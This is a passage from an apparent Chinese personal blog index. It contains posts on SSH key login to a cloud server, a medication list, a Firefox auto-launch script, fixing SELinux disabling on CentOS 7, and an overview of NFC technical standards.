class=\"variable\">$HOME</span>/Downloads/TENCENT_ECS.txt root@119.22.33.44</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"调用方法2：更简单的，Terminal无密码直接登录\"><a href=\"#调用方法2：更简单的，Terminal无密码直接登录\" class=\"headerlink\" title=\"调用方法2：更简单的，Terminal无密码直接登录\"></a>调用方法2：更简单的，Terminal无密码直接登录</h2><p>在ssh指定密钥文件的基础上，还可以将ssh进一步简化为不需要指定密钥文件的信任方式，具体步骤如下：</p>\n<ol>\n<li><p>在mac终端生成公钥文件<code>id_rsa.pub</code>和私钥文件<code>id_rsa</code>。</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>\n\n <img src=\"/2019/05/04/%E4%B8%BAECS%E8%AE%BE%E7%BD%AEssh%E5%AF%86%E9%92%A5%E7%99%BB%E5%BD%95%E7%9A%84%E6%96%B9%E6%B3%95/ecs-3.jpeg\" class=\"\">\n\n<blockquote>\n<p>图中红色标识的是是否对公钥和私钥进行对称加密，如果你输入了的话，那么在后续利用私钥登录的时候，需要输入该密码对私钥进行解密。如果安全性要求不高，可以不输入，直接点击enter跳过。</p>\n</blockquote>\n</li>\n<li><p>在ECS服务器上寻找文件<code>$HOME/.ssh/authorized_keys</code></p>\n</li>\n<li><p>编辑该文件，添加<code>id_rsa.pub</code>里面的公钥数据。</p>\n</li>\n<li><p>修改该文件的权限为644</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">chmod</span> 644 <span class=\"variable\">$HOME</span>/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>现在MAC终端上可免密登录你的Linux服务器了，登录命令:</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh root@119.22.33.44</span><br></pre></td></tr></table></figure>\n\n<p> 或者，你也可以在<code>Terminal</code>的菜单上直接选择<code>选择远程连接</code>，而不需要先打开本地的字符终端了</p>\n<blockquote>\n<ul>\n<li>实际上，这就是腾讯云配置<code>使用已有公钥</code>的原理：首先在Client生成一对私钥和公钥，然后并将公钥内容加入到Server的<code>authorized_keys</code>文件中，使得其成为可信任的Client，这也是Github上代码自动化加载用户自定义运行环境配置的通用方法。</li>\n<li>注意：方法1需要在ssh命令行中指定私钥文件，而方法2不要指定私钥文件的原因是，Terminal自动调用Client的默认存储文件<code>$HOME/.ssh/id_rsa</code>，但前提是密钥是在这个Client生成的，如果其他client想要调用就需要自己去配置Server的公钥文件了。</li>\n</ul>\n</blockquote>\n</li>\n</ol>\n<hr>\n<h2 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h2><ul>\n<li><a href=\"https://cloud.tencent.com/document/product/213/16691#1.-%E5%88%9B%E5%BB%BA%E5%AF%86%E9%92%A5\">腾讯云-如何添加云服务器的密钥对</a></li>\n<li><a href=\"https://cloud.tencent.com/document/product/213/5436#.E4.BD.BF.E7.94.A8-ssh-.E7.99.BB.E5.BD.95.EF.BC.88.E6.9C.AC.E5.9C.B0.E7.B3.BB.E7.BB.9F.E4.B8.BA-linux.2Fmac-os.EF.BC.89\">腾讯云-如何使用SSH密钥文件进行终端接入</a></li>\n<li><a href=\"https://www.runoob.com/w3cnote/set-ssh-login-key.html\">菜鸟学堂-设置SSH密钥的方法</a></li>\n</ul>\n"},{"title":"今天晚上忘了吃药","url":"/2018/12/23/%E4%BB%8A%E5%A4%A9%E6%99%9A%E4%B8%8A%E5%BF%98%E4%BA%86%E5%90%83%E8%8D%AF/","content":"<p>饭可以不吃，药不能停！！！<br>好多药啊！</p>\n<blockquote>\n<ul>\n<li>拜糖平</li>\n<li>二甲双瓜</li>\n<li>甲钴胺</li>\n<li>阿斯匹林</li>\n</ul>\n</blockquote>\n","categories":["生活"],"tags":["兰州","有病"]},{"title":"关于GNOME图形终端的配置要点","url":"/2021/11/06/%E5%85%B3%E4%BA%8EGNOME%E5%9B%BE%E5%BD%A2%E7%BB%88%E7%AB%AF%E7%9A%84%E9%85%8D%E7%BD%AE%E8%A6%81%E7%82%B9/","content":"<h2 id=\"GDM软件配置\"><a href=\"#GDM软件配置\" class=\"headerlink\" title=\"GDM软件配置\"></a>GDM软件配置</h2><h2 id=\"环境变量DISPLAY的设置\"><a href=\"#环境变量DISPLAY的设置\" class=\"headerlink\" title=\"环境变量DISPLAY的设置\"></a>环境变量DISPLAY的设置</h2><h2 id=\"启动脚本\"><a href=\"#启动脚本\" class=\"headerlink\" title=\"启动脚本\"></a>启动脚本</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> DISPLAY=:0.0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">kill</span> -9 `ps -ef |grep firefox |grep -v grep|awk <span class=\"string\">&#x27;&#123;print $2&#125;&#x27;</span>`</span><br><span class=\"line\"><span class=\"built_in\">sleep</span> 5</span><br><span class=\"line\"></span><br><span class=\"line\">/usr/lib64/firefox/firefox https://b2b.10086.cn/b2b/main/listVendorNotice.html?noticeType=1 &amp;</span><br><span class=\"line\"><span class=\"built_in\">sleep</span> 5</span><br><span class=\"line\">/usr/lib64/firefox/firefox https://b2b.10086.cn/b2b/main/listVendorNotice.html?noticeType=2 &amp;</span><br><span class=\"line\"><span class=\"built_in\">sleep</span> 5</span><br><span class=\"line\">/usr/lib64/firefox/firefox https://b2b.10086.cn/b2b/main/listVendorNotice.html?noticeType=3 &amp;</span><br><span class=\"line\"><span class=\"built_in\">sleep</span> 5</span><br><span class=\"line\">/usr/lib64/firefox/firefox https://b2b.10086.cn/b2b/main/listVendorNotice.html?noticeType=7 &amp;</span><br><span class=\"line\"><span class=\"built_in\">sleep</span> 5</span><br><span class=\"line\">/usr/lib64/firefox/firefox https://b2b.10086.cn/b2b/main/listVendorNotice.html?noticeType=8 &amp;</span><br><span class=\"line\"><span class=\"built_in\">sleep</span> 5</span><br><span class=\"line\">/usr/lib64/firefox/firefox https://b2b.10086.cn/b2b/main/listVendorNotice.html?noticeType=16 &amp;</span><br><span class=\"line\"><span class=\"built_in\">sleep</span> 5</span><br></pre></td></tr></table></figure>\n\n<p>创建脚本文件<code>tm-run.sh</code>，添加执行权限，并加入<code>crontab</code>配置中。</p>\n<hr>\n<h3 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h3><ul>\n<li><a href=\"https://www.tampermonkey.net/\">TamperMonkey的官方主页</a></li>\n<li><a href=\"https://wiki.archlinux.org/title/GDM#Automatic_login\">GDM - GNOME Display Manager的官方主页</a></li>\n</ul>\n"},{"title":"关于Selinux的疑难杂症","url":"/2020/09/01/%E5%85%B3%E4%BA%8ESelinux%E7%9A%84%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/","content":"<p>版本的，每次使用都会遇到一些那些不知道的问题。记录下来过程，学习中遇到的一些坑。</p>\n<ul>\n<li>系统版本：CentOS Linux release 7.3.1611 (Core)</li>\n<li>系统内核：3.10.0-514.el7.x86_64</li>\n</ul>\n<p>#获取selinux状态信息<br>[root@17-Cobbler ~]# getenforce<br>Enforcing<br>#临时关闭selinux，跟原来的版本一样的<br>[root@17-Cobbler ~]# setenforce 0<br>[root@17-Cobbler ~]# getenforce<br>Permissive</p>\n<p>#问题就是在修改配置文件<br>#按照CentOS 6修改配置文件的位置:&#x2F;etc&#x2F;sysconfig&#x2F;selinux<br>[root@17-Cobbler ~]# sed -i “s#SELINUX&#x3D;enforcing#SELINUX&#x3D;disabled#g” &#x2F;etc&#x2F;sysconfig&#x2F;selinux</p>\n<p>#一直以为这样就是可以了，没有检查。直到搭建服务Cobbler、zabbix老是出错问题，查日志才发现原来selinux没有<br>关闭，懵逼了。修改&#x2F;etc&#x2F;sysconfig&#x2F;selinux没有生效，然后百度查询发现有这样一个命令sestatus。</p>\n<p>[root@17-Cobbler conf.d]# sestatus<br>SELinux status:                 enabled<br>SELinuxfs mount:                &#x2F;sys&#x2F;fs&#x2F;selinux<br>SELinux root directory:         &#x2F;etc&#x2F;selinux<br>Loaded policy name:             targeted<br>Current mode:                   permissive<br>Mode from config file:          enforcing<br>Policy MLS status:              enabled<br>Policy deny_unknown status:     allowed<br>Max kernel policy version:      28</p>\n<p>#测试将原来的修改&#x2F;etc&#x2F;sysconfig&#x2F;selinux，selinux状态改成enforcing<br>#然后将&#x2F;etc&#x2F;selinux&#x2F;config，selinux状态修改成disabled<br>[root@17-Cobbler ~]# sed -i “s#SELINUX&#x3D;enforcing#SELINUX&#x3D;disabled#g” &#x2F;etc&#x2F;selinux&#x2F;config<br>#重启<br>[root@17-Cobbler ~]# reboot<br>#再次获取状态，已经关闭了<br>[root@17-Cobbler ~]# getenforce<br>Disabled<br>#确认已经关闭了<br>[root@17-Cobbler ~]# sestatus<br>SELinux status:                 disabled</p>\n<p>&#x2F;etc&#x2F;sysconfig&#x2F;selinux和&#x2F;etc&#x2F;selinux&#x2F;config配置文件的联系及区别</p>\n<p>1.一开始&#x2F;etc&#x2F;sysconfig&#x2F;selinux是&#x2F;etc&#x2F;selinux&#x2F;config的软链接关系</p>\n<p>2.由于脚本使用sed -i ‘s&#x2F;SELINUX&#x3D;enforcing&#x2F;SELINUX&#x3D;disabled&#x2F;g’ &#x2F;etc&#x2F;sysconfig&#x2F;selinux</p>\n<p>   对&#x2F;etc&#x2F;sysconfig&#x2F;selinux文件进行修改，导致两者软连接关系破裂，变为一个普通文件，并不再被系统作为selinux的配置文件</p>\n<p>3.关闭selinux，直接修改&#x2F;etc&#x2F;selinux&#x2F;config配置文件，并重启，即可生效</p>\n<hr>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><a href=\"https://blog.51cto.com/jschu/2084898\">关闭SELinux的彻底解决办法</a></li>\n<li><a href=\"https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/reference_guide/s2-selinux-files-etc\">Redhat关于关闭SELinux的官方文档</a></li>\n<li><a href=\"https://www.cnblogs.com/gailuo/p/3805223.html\">SELinux三种模式之间的转换</a></li>\n</ul>\n"},{"title":"关于NFC技术标准体系的综述","url":"/2021/08/15/%E5%85%B3%E4%BA%8ENFC%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86%E4%BD%93%E7%B3%BB%E7%9A%84%E7%BB%BC%E8%BF%B0/","content":"<h2 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h2><p>NFC（<code>Near Field Communication</code>，近场通信），也叫做近距离无线通信技术，用于在两个非常接近的设备之间执行数据传输。</p>\n<ul>\n<li>2002年，NFC技术由<code>Philips</code>和<code>Sony</code>两家公司联合推出。</li>\n<li>2004年，<code>Nokia</code>、<code>Philips</code>、<code>Sony</code>等公司共同组建了非盈利性组织<code>NFC Forum</code> ，负责制定NFC相关的技术标准，致力于促进 NFC 技术在消费类电子产品、移动设备和 PC 中的应用，并通过NFC认证测试来保证各厂家的NFC产品符合NFC规范以实现互联互通。</li>\n<li>2006年，恩智浦半导体公司(<code>NXP</code> Semiconductors)从<code>Philips</code>剥离，总部位于荷兰埃因霍温，在全球20多个国家拥有37000名员工（欧洲37%、亚洲37%、大中华区21%、美洲5%），2007年公布的销售额达63亿美元。</li>\n</ul>\n<p>NFC的核心技术优势在于：</p>\n<ul>\n<li><strong>无源硬件</strong>：采用感应耦合技术，NFC标签可以从其他NFC设备产生的电磁场获得能量，经济实惠且完全无源，特别适合IoE（物联网）应用场景</li>\n<li><strong>公开频段</strong>：电磁场频率为 13.56 MHz，该频率是射频频谱高频部分中无需执照的波段，有效距离为4cm左右，目前所支持的数据传输速率有106Kbps、212Kbps和424Kbps三种</li>\n<li><strong>一触即发</strong>：用户无需事先启动APP（特定场景可能要求安全验证），基于硬件支持即可触发NFC，交互时间只有几分之一秒</li>\n<li><strong>终端集成</strong>：NFC软件协议栈完全集成到Android（v.4.0以上）、iOS（v.11）中，有助于在多个应用程序中使用NFC，而无需安装任何特定软件或应用</li>\n</ul>\n<p>需要注意的是，NFC技术演进路线中，多个标准化组织为争夺主导权，互相竞争也互相融合。</p>\n<ul>\n<li><code>NFC Forum</code>是最重要的标准化组织，影响力最大；</li>\n<li><code>ISO/IEC</code>也是重要的标准化组织，但侧重从RF（Radio Frequency，无线频率）和数据交换格式等底层定义，较少涉及业务和应用层面；</li>\n<li>此外，还存在<code>ETSI</code>,<code>ECMA</code>,<code>GB</code>,<code>JIS</code>等区域性的国家标准。</li>\n</ul>\n<p>下图是简化的协议栈结构，本文将以NFC-Froum为主线，对相关技术标准进行阐述。</p>\n<img src=\"/2021/08/15/%E5%85%B3%E4%BA%8ENFC%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86%E4%BD%93%E7%B3%BB%E7%9A%84%E7%BB%BC%E8%BF%B0/protocol-1.png\" class=\"\">\n\n<h2 id=\"NFC的演进历史\"><a href=\"#NFC的演进历史\" class=\"headerlink\" title=\"NFC的演进历史\"></a>NFC的演进历史</h2><p>NFC是多种技术路线并行发展的综合体，得益于条形码、磁条卡和智能终端三种技术的共同推动。</p>\n<img src=\"/2021/08/15/%E5%85%B3%E4%BA%8ENFC%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86%E4%BD%93%E7%B3%BB%E7%9A%84%E7%BB%BC%E8%BF%B0/nfc-map.png\" class=\"\">\n\n<ol>\n<li><p>最左边一条为发源于条形码（Barcodes）的无线射频识别技术，即RFID技术路线，最终出现了NFC中的两个重要组件<code>NFC Tag</code>（标签）和<code>NFC Reader</code>(读卡器)。</p>\n</li>\n<li><p>最右边一条为磁条卡（Magnetic Strip Cards）技术路线，该路线后来向智能卡（Smart Card）、非接触式智能卡的方向发展。</p>\n<p> 粗略来看Smart Card和RFID Tag类似，例如二者都只存储一些数据，而且自身都没有电源组件，但Smart Card在安全性上的要求远比RFID Tag严格。另外，Smart Card上还能运行一些小的嵌入式系统（如Java Card OS）或者应用程序（Applets）以完成更为复杂的工作。</p>\n<p> Smart Card是NFC技术演进的核心来源，主要包含三个分支：</p>\n<ul>\n<li><p>Proximity Coupling Smart Card（近场耦合智能卡）：对应规范为<code>ISO/IEC 14443</code>，有效距离在10cm之内，是消费市场上最普及的技术标准。NFC Form为此定义了<code>NFC-A</code>，<code>NFC-B</code>和非ISO标准的<code>NFC-F</code>，区别主要在于调制编码方式的不同。</p>\n</li>\n<li><p>Vicinity Coupling Smart Card（疏耦合智能卡）：对应规范为<code>ISO/IEC 15693</code>，有效距离高达1m，NFC Form为此定义了<code>NFC-V</code>。</p>\n<blockquote>\n<p>该技术标准由于读取距离远，使用场景的温度要求远高于消费级产品（通常是-40度到+85度），同时设计简单使得读取器的生产成本低，在物流运输、企业门禁卡等场景中得到广泛应用</p>\n</blockquote>\n</li>\n<li><p>Close Coupling Smart Card：对应的规范是<code>ISO 10536</code>，该标准主要发展于1992到1995年间，由于这种卡的成本高，优点少，因此从未在市场上销售。</p>\n</li>\n</ul>\n</li>\n<li><p>中间一条技术路线为移动终端，它演化出了携带NFC功能的终端设备。随着移动终端越来越智能，NFC和这些设备也融合得更加紧密，使得NFC的应用场景得到了较大的拓展。</p>\n</li>\n</ol>\n<p>从协议栈的角度，下图是 NFC 各类标签所涉及的技术标准。</p>\n<img src=\"/2021/08/15/%E5%85%B3%E4%BA%8ENFC%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86%E4%BD%93%E7%B3%BB%E7%9A%84%E7%BB%BC%E8%BF%B0/protocol-2.png\" class=\"\">\n\n<p>此外，还有几个与NFC密切相关的技术标准：</p>\n<h3 id=\"ISO-IEC-7816\"><a href=\"#ISO-IEC-7816\" class=\"headerlink\" title=\"ISO/IEC 7816\"></a><code>ISO/IEC 7816</code></h3><p>一套成熟的接触式智能卡标准，用于读写接触式智能卡，例如PSAM、SAM、手机的SIM卡等皆符合该协议标准，其采用半双工串行通信接口，由VCC, RESET, CLK, IO, VPP（保留接口，不使用）组成。</p>\n<p>其中有一部分定义了与应用相关的规范，NFC Forum也参照该标准实现了类似功能。其全部内容包括：</p>\n<ul>\n<li>ISO7816-1：接触式卡智能卡的物理特性</li>\n<li>ISO7816-2：接触式卡智能卡触点的尺寸与位置</li>\n<li>ISO7816-3：接触式卡智能卡的电信号和传输协议</li>\n<li>ISO7816-4：接触式卡智能卡与外界交互的介面</li>\n<li>ISO7816-5：接触式卡智能卡应用的命名方式与注册系统</li>\n<li>ISO7816-6：接触式卡智能卡与外界交互的资料物件</li>\n<li>ISO7816-7：接触式卡智能卡的结构化查询语句</li>\n<li>ISO7816-8：接触式卡智能卡与安全有关的指令</li>\n<li>ISO7816-9：接触式卡智能卡附加指令与安全参数</li>\n</ul>\n<h3 id=\"S2C接口-ISO-IEC-28361\"><a href=\"#S2C接口-ISO-IEC-28361\" class=\"headerlink\" title=\"S2C接口 &#x3D;  ISO/IEC 28361\"></a><code>S2C接口</code> &#x3D;  <code>ISO/IEC 28361</code></h3><p>由飞利浦公司最早提出，用于在手机上实现 NFC 功能，定义了NFC芯片和智能卡芯片的接口方式，并成为ISO 和 ECMA的共同标准。<br>此后，由于遭到主流运营商的反对，最终飞利浦公司放弃了该技术标准，转而与GEMALTO公司合作支持<code>SWP协议</code>。</p>\n<h3 id=\"SWP协议-ETSI-TS-102613\"><a href=\"#SWP协议-ETSI-TS-102613\" class=\"headerlink\" title=\"SWP协议 &#x3D; ETSI TS-102613\"></a><code>SWP协议</code> &#x3D; <code>ETSI TS-102613</code></h3><p>由GEMALTO公司提出，法国公司 Inside开发了支持 SWP 的产品雏形。<br>单线连接协议(Single Wire Protocol)，定义了CLF模块和USIM卡内的SE芯片传输信息的物理连接形式和底层信号传输方式。由于商业利益的考虑，最终SWP的架构获得运营商（GSMA）的一致支持，已经成为事实上的行业标准。</p>\n<p>该标准已经获得<code>ETSI TS-102613</code>，但尚未成为ISO标准。</p>\n<blockquote>\n<p>SWP 也好、S2C 也好，和 NFC 规范是没有直接联系的，更没有冲突。NFC 规范定义的是 NFC 设备与外界的通讯规范，S2C&#x2F;SWP 定义的是 NFC 内部实现的不同方式，是 NFC 芯片和智能卡芯片芯片之间的接口方式和通讯协议。NFC（ISO 18902）和SWP， NFC 论坛和 ETSI 也是没有直接联系，更没有直接冲突，这些是组成完整的 NFC 系统和产业环境必不可少的几个部分。</p>\n</blockquote>\n<h2 id=\"NFC的运行模式\"><a href=\"#NFC的运行模式\" class=\"headerlink\" title=\"NFC的运行模式\"></a>NFC的运行模式</h2><p>从用户角度（即图中的Applications层之上）来看，NFC有三种运行模式（operation mode），分别是</p>\n<ul>\n<li><code>Reader/Write</code>：简称R&#x2F;W，和NFC Tag&#x2F;NFC Reader相关</li>\n<li><code>Card Emulation</code>：简称CE，它能把携带NFC功能的设备模拟成Smart Card，这样就能实现诸如手机支付、门禁卡之类的功能</li>\n<li><code>Peer-to-Peer</code>：简称P2P，它支持两个NFC设备交互</li>\n</ul>\n<img src=\"/2021/08/15/%E5%85%B3%E4%BA%8ENFC%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86%E4%BD%93%E7%B3%BB%E7%9A%84%E7%BB%BC%E8%BF%B0/nfc-mode.png\" class=\"\">\n\n<h3 id=\"读卡器模式（Reader-Write-Mode）\"><a href=\"#读卡器模式（Reader-Write-Mode）\" class=\"headerlink\" title=\"读卡器模式（Reader&#x2F;Write Mode）\"></a>读卡器模式（Reader&#x2F;Write Mode）</h3><p>在读写器模式中，NFC读卡器询问标签以执行交互。NFC Forum定义了5种类型的标签，涵盖了广泛的应用。读卡器可以是专用的NFC读写器，也可以是移动设备。NFC读写器能够感测多个标签的存在。</p>\n<p>数据在NFC Tag的芯片中，可以简单理解成<strong>刷标签</strong>，本质上就是通过支持NFC的手机或其它电子设备从带有NFC芯片的标签、贴纸、名片等媒介中读写信息，随后它可能根据读取来自部件的信息执行操作。例如，靠近 NFC 标签的 NFC 手机会检索到一个 URL，并链接到相应的网站，NFC手机可以在无需打字的情况下发送 SMS （短消息服务）文本、获得优惠券、启动配对动作、获得电子名片（Vcard）等。</p>\n<img src=\"/2021/08/15/%E5%85%B3%E4%BA%8ENFC%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86%E4%BD%93%E7%B3%BB%E7%9A%84%E7%BB%BC%E8%BF%B0/rw-mode.jpg\" class=\"\">\n\n<p>对于读卡器模式，NFC Forum定义了4种标准类型的<a href=\"#NFC%E6%A0%87%E7%AD%BE\">NFC标签</a>（Type 5还不是正式标准），这四种类型NFC Tag的区别在于存储空间大小，数据传输率以及底层使用的协议上，后面有具体的技术细节。</p>\n<p>此外，NFC Forum定义了两个通用的数据结构用于在NFC Device之间（包括R&#x2F;W模式中的NFC Reader和NFC Tag）传递数据。这两个通用数据结构分别是NFC Data Exchange Format（简写为NDEF）以及NFC Record。</p>\n<blockquote>\n<p>对于“刷标签”场景，NFC 手机工作在主动模式，而NFC标签是不需要外部供电的，依靠NFC手机发送的电磁场获得能量，<strong>此时数据传输是不安全的</strong>。</p>\n</blockquote>\n<h3 id=\"卡模拟模式（Card-Emulation-Mode）\"><a href=\"#卡模拟模式（Card-Emulation-Mode）\" class=\"headerlink\" title=\"卡模拟模式（Card Emulation Mode）\"></a>卡模拟模式（Card Emulation Mode）</h3><p>数据在支持NFC的手机中，可以简单理解成<strong>刷手机</strong>。本质上就是将支持NFC的手机或其它电子设备当成借记卡、公交卡、门禁卡等IC卡使用。</p>\n<p>基本原理是将相应IC卡中的信息凭证封装成数据包存储在支持NFC的外设中，在使用时还需要一个NFC射频器（例如Pos终端、闸机等），将手机靠近NFC射频器，手机就会接收到NFC射频器发过来的信号，在通过一系列复杂的验证后，将IC卡的相应信息传入NFC射频器，最后这些IC卡数据会传入NFC射频器连接的电脑，并进行相应的处理（如电子转帐、开门等操作），这让它可以用于已有的非接触式智能卡基础设施，实现访问控制、非接触式支付、固件更换或数据传输等操作。</p>\n<p>通常存在于移动设备中的NFC控制器模拟ISO &#x2F; IEC 14443或FeliCa标准定义的非接触式卡的行为，用于诸如支付、交通等非接触式基础设施中。<br>在此模式下，NFC控制器仅处理低级别通信，而NFC安全应用程序位于SIM卡、嵌入式安全元件（eSE）、嵌入式SIM卡（eSIM）中或直接位于主应用程序处理器（Android的HCE）中。</p>\n<img src=\"/2021/08/15/%E5%85%B3%E4%BA%8ENFC%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86%E4%BD%93%E7%B3%BB%E7%9A%84%E7%BB%BC%E8%BF%B0/ce-mode.jpg\" class=\"\">\n\n<p>该模式下，NFC 手机的工作类似于标准的<a href=\"#NFC%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93\">非接触式IC卡</a>，为此ISO 14443定义了Type A 和 Type B两种数据传输标准（Type F不是正式标准），后续有详细技术分析。</p>\n<blockquote>\n<p>对于“刷手机”场景，NFC 手机工作在被动模式，它只在机具发出的射频场中被动响应，<strong>数据传输是安全的</strong>。</p>\n</blockquote>\n<h3 id=\"点对点模式（Peer-to-Peer-Mode）\"><a href=\"#点对点模式（Peer-to-Peer-Mode）\" class=\"headerlink\" title=\"点对点模式（Peer-to-Peer Mode）\"></a>点对点模式（Peer-to-Peer Mode）</h3><p>此模式设计用于交换两个NFC设备（如移动电话）之间的联系人信息等数据。每个点轮流作为读卡器（收发器）和标签，以实现双方之间的完整交换。</p>\n<p>在点对点 （P2P）中，具有 NFC 功能的设备工作在主动模式。其中的一个设备会发起通信链接。一旦链接建立，设备就会交替地与其他设备通信，并遵守 “ 说前先听 （listen-before\u0002talk） ” 规则。该通信模式下的数据交换相比其他模式更快，因此可以交换更多的数据。</p>\n<h3 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h3><p>从协议栈的角度，三种工作模式的分析如下：</p>\n<img src=\"/2021/08/15/%E5%85%B3%E4%BA%8ENFC%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86%E4%BD%93%E7%B3%BB%E7%9A%84%E7%BB%BC%E8%BF%B0/rf.jpg\" class=\"\">\n\n<h2 id=\"NFC的数据传输协议\"><a href=\"#NFC的数据传输协议\" class=\"headerlink\" title=\"NFC的数据传输协议\"></a>NFC的数据传输协议</h2><p>NFC Forum定义了5种数据传输方式，其中：</p>\n<ul>\n<li>NFC-A：对应<code>ISO 14443 Type A</code></li>\n<li>NFC-B：对应<code>ISO 14443 Type B</code></li>\n<li>NFC-F：对应非ISO标准的<code>FeliCa</code>，也称为Type-F</li>\n<li>NFC-V：对应<code>ISO 15693</code></li>\n<li>P2P：基于<code>ISO 18092</code>，主要用于Android Beam，实现两台 Android 设备之间进行简单的点对点数据交换</li>\n</ul>\n<p><code>ISO 14443</code>全称为非接触式IC卡标准，它从RF层面定义了如何与不同的非接触式IC卡（其实物可以是NFC Tag、RFID Tag、Smart Cards）交互。</p>\n<p>该标准包含四个部分：</p>\n<ul>\n<li>ISO&#x2F;IEC14443-1:   制定了有关非接触卡的物理特性；</li>\n<li>ISO&#x2F;IEC14443-2:   制定了有关射频功率及信号界面的特性；</li>\n<li>ISO&#x2F;IEC14443-3:   则为非接触卡的初始化及防冲突机制；</li>\n<li>ISO&#x2F;IEC14443-4:   位有关的交易协定。</li>\n</ul>\n<p>ISO 14443定义了Type A和Type B两种非接触式IC卡。不同TYPE的主要的区别在于信号发送的载波调制深度、二进制数编码方式存在差异。此外，防冲突机制的原理也完全不同，TYPE A是基于 BIT 冲突检测协议，TYPE B则是通过字节、帧及命令完成防冲突。</p>\n<h3 id=\"NFC-A-ISO-IEC-14443-3-Type-A\"><a href=\"#NFC-A-ISO-IEC-14443-3-Type-A\" class=\"headerlink\" title=\"NFC-A &#x3D; ISO&#x2F;IEC 14443-3 Type A\"></a>NFC-A &#x3D; ISO&#x2F;IEC 14443-3 Type A</h3><p>最早由Philips公司制订（其生产的芯片商标名为MIFARE，现在由从Philips独立出来的NXP公司拥有），目前世界上70%左右的非接触式IC卡都使用了MIFARE芯片，例如北京市的公交卡，特点是采用Modified Miller编码。</p>\n<blockquote>\n<p>Android 4.4 支持基于NFC-Forum ISO-DEP规范（基于ISO&#x2F;IEC 14443-4）的模拟卡，要求仅使用 Nfc-A (ISO&#x2F;IEC 14443-3 Type A) 技术模拟 ISO-DEP，但也可以支持 Nfc-B (ISO&#x2F;IEC 14443-4 Type B) 技术。</p>\n</blockquote>\n<h3 id=\"NFC-B-ISO-IEC-14443-4-Type-B\"><a href=\"#NFC-B-ISO-IEC-14443-4-Type-B\" class=\"headerlink\" title=\"NFC-B &#x3D; ISO&#x2F;IEC 14443-4 Type B\"></a>NFC-B &#x3D; ISO&#x2F;IEC 14443-4 Type B</h3><p>由TI公司制订，主要用在法国市场，特点是采用NRZ编码，二者最终都成为ISO标准。</p>\n<blockquote>\n<p>第二代居民身份证采用的是Type B标准。</p>\n</blockquote>\n<h3 id=\"NFC-F-FeliCa-JIS-X6319-4\"><a href=\"#NFC-F-FeliCa-JIS-X6319-4\" class=\"headerlink\" title=\"NFC-F &#x3D; FeliCa &#x3D; JIS X6319-4\"></a>NFC-F &#x3D; FeliCa &#x3D; JIS X6319-4</h3><p>FeliCa是Sony为了非接触式IC卡而开发出来的通信技术，与ISO 14443标准的主要区别是采用曼彻斯特编码。<br>1998年，FeliCa原本被提案为ISO 14443 type C，但悲剧的是未被采纳，只能成为日本工业标准<code>JIS X6319-4</code>。之后，FeliCa和其向后相容方式被标准化为<code>ISO 18092</code>。</p>\n<blockquote>\n<p>目前，Felica也被称为Type F，主要应用于日本市场，境外只有香港的“八达通”仍有继续使用。</p>\n</blockquote>\n<h3 id=\"NFC-V-ISO-IEC-15693-2\"><a href=\"#NFC-V-ISO-IEC-15693-2\" class=\"headerlink\" title=\"NFC-V &#x3D; ISO&#x2F;IEC 15693-2\"></a>NFC-V &#x3D; ISO&#x2F;IEC 15693-2</h3><p><code>ISO/IEC 15693</code> 标准最初是为访问控制而设计的，符合此标准的标签的读取范围高达 3 英尺（0.9 米）,主要用于公共图书馆 RFID 系统和带 RFID 卡或 RFID 票证的滑雪通行证 RFID 系统.<br>对比，<code>ISO/IEC 14443 Type A</code> 标签，由于其主要为银行RFID卡、交通RFID卡等金融交易而设计，为防止有人截获从标签发送到读取器的数据，读取距离设计为非常短，安全性要求更高。</p>\n<h2 id=\"NFC的标签类型\"><a href=\"#NFC的标签类型\" class=\"headerlink\" title=\"NFC的标签类型\"></a>NFC的标签类型</h2><p>NFC 论坛定义了四种类型的 NFC 标签，第五种标签与 NFC-V 技术相关，目前它还不是NFC 论坛规范中的一部分。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">项目</th>\n<th align=\"center\">Type 1</th>\n<th align=\"center\">Type 2</th>\n<th align=\"center\">Type 3</th>\n<th align=\"center\">Type 4</th>\n<th align=\"center\">Type 5</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">对应规范</td>\n<td align=\"center\">ISO 14443 Type A</td>\n<td align=\"center\">ISO 14443 Type A</td>\n<td align=\"center\">JIS X 6319-4、FELICA</td>\n<td align=\"center\">ISO 14443 Type A&#x2F;B</td>\n<td align=\"center\">ISO&#x2F;IEC 15693</td>\n</tr>\n<tr>\n<td align=\"center\">常见芯片</td>\n<td align=\"center\">Topaz</td>\n<td align=\"center\">MIFARE</td>\n<td align=\"center\">Felica</td>\n<td align=\"center\">MIFARE-DESFire</td>\n<td align=\"center\">NXP的I Code系列，ST的ST25TV系列</td>\n</tr>\n<tr>\n<td align=\"center\">存储容量</td>\n<td align=\"center\">最大1KB</td>\n<td 